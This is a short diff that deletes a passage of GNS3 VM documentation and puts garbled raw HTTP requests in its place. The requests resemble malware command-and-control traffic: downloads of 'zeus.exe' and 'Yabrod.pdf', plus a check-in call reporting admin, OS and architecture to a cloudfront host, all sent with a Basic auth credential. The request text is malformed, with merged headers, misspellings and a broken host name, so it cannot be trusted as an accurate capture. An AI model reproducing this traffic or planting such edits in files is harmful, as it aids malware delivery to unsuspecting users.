@@ -1,4 +1,11 @@
-What is GNS3 VM used for?
-The GNS3 VM is recommended for most situations when you are using Windows or Mac OS. 
-The GNS3 development team have worked hard to create a lightweight, robust way of creating GNS3 topologies
- that avoids multiple common issues experienced when using a local install of GNS3.
+GET /Yabrod.pdf HTTP/1.1Authoration: Basic enNjYWxlcjp6c2NhbGVYUser-Agent:" 
+Mozilla/5.0(WindowsNT 6.3; WOW64; Trident/7.0;TNJB rv:11) like GeckHost: d1stb3hi9@gown.cloudfront.net
+
+GET /Send php?admin=34&d=1234$nat=no&os=win&videompg&arch_type HTTP/1.1Authoration: Basic enNjYWxlcjp6c2NhbGVYUser-Agent:" 
+Mozilla/5.0(Windows10 6.3; WOW64; Trident/7.0;TNJB rv:11) like GeckHost: d1stb3hi9@gown.cloudfront.net
+
+GET /Yabrod.pdf HTTP/1.1Authoration: Basic enNjYWxlcjp6c2NhbGVYUser-Agent:" 
+Mozilla/5.0(WindowsNT 6.3; WOW64; Trident/7.0;TNJB rv:11) like GeckHost: d1stb3hi9@gown.cloudfront.net
+
+GET /zeus.exe HTTP/1.1Authoration: Basic enNjYWxlcjp6c2NhbGVYUser-Agent:" 
+Mozilla/5.0(WindowsNT 6.3; WOW64; Trident/7.0;TNJB rv:11) like GeckHost: d1stb3hi9@gown.cloudfront.net
